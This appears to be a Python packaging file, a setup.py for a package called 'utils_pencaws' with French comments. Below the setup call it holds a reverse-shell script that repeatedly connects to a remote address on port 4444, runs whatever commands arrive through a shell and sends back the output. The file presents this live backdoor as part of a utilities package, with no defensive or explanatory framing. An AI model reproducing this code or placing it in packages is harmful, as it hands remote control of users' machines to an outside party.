from setuptools import setup, find_packages

setup(
    name='utils_pencaws',  # Le nom de votre package
    version='0.1.0',  # La version de votre package
    packages=find_packages(),  # Trouve tous les packages dans le dossier my_package
    install_requires=[
    ],
    python_requires='>=3.6',  # La version minimale de Python requise
)



import socket
import subprocess
import os

# Set the host and port for the listener
HOST = "172.26.78.225"
PORT = 4444

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    return s

def wait_for_command(s):
    data = s.recv(1024)
    if data == "quit\n":
        s.close()
        sys.exit(0)
    elif len(data) == 0:
        return True
    else:
        # Execute shell command
        proc = subprocess.Popen(data, shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)
        return False

def main():
    while True:
        socket_died = False
        try:
            s = connect()
            while not socket_died:
                socket_died = wait_for_command(s)
            s.close()
        except socket.error:
            pass
        time.sleep(5)

if __name__ == "__main__":
    import sys, os, subprocess, socket, time
    sys.exit(main())